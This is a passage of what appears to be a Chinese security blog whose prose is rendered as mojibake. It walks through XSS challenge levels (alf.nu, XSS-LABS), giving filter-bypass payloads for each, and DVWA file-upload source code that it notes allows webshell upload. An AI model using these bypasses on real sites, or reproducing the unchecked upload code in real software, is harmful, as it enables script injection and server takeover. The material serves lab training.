  <span class="token keyword">var</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
  a<span class="token punctuation">.</span>href <span class="token operator">=</span> url
  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
  a<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>

`
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤äº†å¾ˆå¤šç¬¦å·ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç»•è¿‡â€œè™½ç„¶è¢«è¿‡æ»¤ï¼Œä½†\æ­£å¥½å¯ä»¥ä½œä¸ºå‰é¢çš„å†…å®¹ï¼Œ/è™½ç„¶ä¹Ÿè¢«è¿‡æ»¤ï¼Œä½†ä¸¤ä¸ª/è¿‡æ»¤ä¹‹åè¿˜æ˜¯æ³¨é‡Šçš„æ•ˆæœã€‚</p>
<pre><code>&quot;);alert(1)//</code></pre>
<h5 id="0x12"><a href="#0x12" class="headerlink" title="#0x12"></a>#0x12</h5><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// from alf.nu</span>
<span class="token keyword">function</span> <span class="token function">escape</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">"/g, '\\"</span>'<span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>ä»£ç åˆ†æï¼šè¿‡æ»¤â€ï¼Œæ„Ÿè§‰è¿˜ä¸å¦‚ä¸Šå…³ã€‚</p>
<pre><code>&quot;)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<p>æ€»ç»“ä¸‹å§ï¼šè¿™ä¸ªé¶åœºå¾ˆé€‚åˆåƒä½œè€…è¿™ç§åˆšå…¥é—¨XSSçš„èœé¸Ÿå»åˆ·åˆ·ã€‚</p>
<h3 id="XSS-LABS"><a href="#XSS-LABS" class="headerlink" title="XSS-LABS"></a>XSS-LABS</h3><h5 id="0x01-1"><a href="#0x01-1" class="headerlink" title="#0x01"></a>#0x01</h5><p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x02-1"><a href="#0x02-1" class="headerlink" title="#0x02"></a>#0x02</h5><p>ä»£ç å›æ˜¾çš„ä½ç½®åœ¨æ ‡ç­¾å†…</p>
<pre class=" language-php"><code class="language-php"><span class="token markup">&lt;input name=keyword  value="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>"<span class="token operator">></span></code></pre>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
<h5 id="0x03-1"><a href="#0x03-1" class="headerlink" title="#0x03"></a>#0x03</h5><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>.htmlspecialchars($str).<span class="token punctuation">"</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span></code></pre>
<p>åˆ©ç”¨å‡½æ•°å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ã€‚æŸ¥çœ‹ç½‘é¡µæºä»£ç </p>
<pre><code>&lt;input name=keyword  value=&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;&gt;    </code></pre>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&#39; onclick=&#39;alert(1)</code></pre>
<h5 id="0x04-1"><a href="#0x04-1" class="headerlink" title="#0x04"></a>#0x04</h5><p>å’Œç¬¬3ä¸€æ ·ä½†æ³¨æ„åˆ°ä¸¤å…³é—­åˆä½¿ç”¨çš„å¼•å·ä¸åŒè¿™å…³æ˜¯â€ã€‚</p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&quot; onclick=&quot;alert(1)</code></pre>
<h5 id="0x05-1"><a href="#0x05-1" class="headerlink" title="#0x05"></a>#0x05</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>è¿‡æ»¤äº†onå’Œ&lt;script</p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></pre>
<h5 id="0x06-1"><a href="#0x06-1" class="headerlink" title="#0x06"></a>#0x06</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>è¿‡æ»¤äº†æ›´å¤šï¼Œå¤§å°å†™æ··åˆç»•è¿‡</p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&quot;&gt;&lt;a hREf=&quot;javascript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></pre>
<h5 id="0x07-1"><a href="#0x07-1" class="headerlink" title="#0x07"></a>#0x07</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>è¿™å…³æ˜¯æ›¿æ¢æˆç©ºï¼Œä»£ç å åŠ ç»•è¿‡</p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&quot;&gt;&lt;a hrhrefef=&quot;javascscriptript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></pre>
<h5 id="0x08-1"><a href="#0x08-1" class="headerlink" title="#0x08"></a>#0x08</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token punctuation">.</span><span class="token variable">$str7</span><span class="token punctuation">.</span><span class="token string">'">å‹æƒ…é“¾æ¥&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span></code></pre>
<p>å¯ä»¥åˆ©ç”¨HTMLå®ä½“ç¼–ç ç»•è¿‡ï¼Œ&amp;#82ï¼›ä»£è¡¨R</p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>javasc&amp;#82;ipt:alert(&#39;http://xss&#39;)</code></pre>
<h5 id="0x09-1"><a href="#0x09-1" class="headerlink" title="#0x09"></a>#0x09</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'))</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼">å‹æƒ…é“¾æ¥&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">else</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
  <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token punctuation">.</span><span class="token variable">$str7</span><span class="token punctuation">.</span><span class="token string">'">å‹æƒ…é“¾æ¥&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>å¤šäº†åˆ¤è¯»è¯­å¥ï¼Œå¿…é¡»è¦å«æœ‰httpï¼š//æ‰è¡Œ</p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>javasc&amp;#82;ipt:alert(&#39;http://xss&#39;)</code></pre>
<h5 id="0x0A-1"><a href="#0x0A-1" class="headerlink" title="#0x0A"></a>#0x0A</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str33.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span></code></pre>
<p>è¿™é‡Œå›æ˜¾çš„æ˜¯t_sortï¼Œæ‰€ä»¥éœ€è¦ç›´æ¥æ„é€ </p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&amp;t_sort=click me!&quot; type=&quot;button&quot; onclick=&quot;alert(1)</code></pre>
<h5 id="0x0B-1"><a href="#0x0B-1" class="headerlink" title="#0x0B"></a>#0x0B</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>å›æ˜¾çš„å†…å®¹æ˜¯httpè¯·æ±‚åŒ…çš„refereréƒ¨åˆ†ï¼Œç”¨burpæˆªåŒ…ä¿®æ”¹refereréƒ¨åˆ†</p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></pre>
<h5 id="0x0C-1"><a href="#0x0C-1" class="headerlink" title="#0x0C"></a>#0x0C</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<p>ä¿®æ”¹User-Agent</p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></pre>
<h5 id="0x0D-1"><a href="#0x0D-1" class="headerlink" title="#0x0D"></a>#0x0D</h5><pre class=" language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
<p>ä¿®æ”¹Cookie</p>
<p>#ä»£ç åˆ©ç”¨</p>
<pre><code>&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></pre>
<h5 id="0x0E"><a href="#0x0E" class="headerlink" title="#0x0E"></a>#0x0E</h5><p>ä¸èƒ½è¿›è¡Œæµ‹è¯•</p>
<h5 id="0x0F-1"><a href="#0x0F-1" class="headerlink" title="#0x0F"></a>#0x0F</h5>
        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/01/04/DVWA/">
                DVWA
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-01-04</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>â‘ Low</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
     <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span><span class="token punctuation">.</span><span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>       
     <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                 </span>
         <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>         
         <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>         
         <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
     <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;               </span>
         <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>         
         <span class="token keyword">echo</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">' succesfully uploaded!'</span><span class="token punctuation">;</span>         
         <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>               
     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
<span class="token delimiter">?></span> </code></pre>
<p>ä»æºç é‡Œå¯ä»¥çœ‹å‡ºå¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰åšä»»ä½•çš„æ£€æµ‹ã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥ä¸Šä¼ webshellã€‚</p>
<p>â‘¡Medium</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span><span class="token punctuation">.</span><span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>       
         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;          if(!move_uploaded_file($_FILES[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                   </span>
             <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
             <span class="token keyword">echo</span> <span class="token string">'Your image was not uploaded.'</span><span class="token punctuation">;</span>           
             <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
      <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;                   </span>
            <span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>           
            <span class="token keyword">echo</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">' succesfully uploaded!'</span><span class="token punctuation">;</span>           
            <span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>                     
           <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;       </span>
       <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;       </span>
      <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;         </span>
            <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span class="token punctuation">;</span>       
          <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
<span class="token delimiter">?></span> </code></pre>
<p>ä»æºç ä¸­å¯ä»¥çœ‹è§ï¼Œé€šè¿‡$_FILESæ¥è·å–ä¸Šä¼ æ–‡ä»¶çš„åå­—ï¼Œç±»å‹ï¼Œå¤§å°ã€‚å¦‚æœæ–‡ä»¶ç±»å‹å’Œå¤§å°ç¬¦åˆè¦æ±‚å°±å¯ä»¥ä¸Šä¼ ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥ç”¨burpè¿›è¡Œæ‹¦æˆªä¿®æ”¹Connect-Type ä¸º image/jpeg  å³å¯ä¸Šä¼ æˆåŠŸwebshellã€‚</p>
<p>â‘¢High</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> 
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span><span class="token punctuation">.</span><span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>       
         <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
         <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       
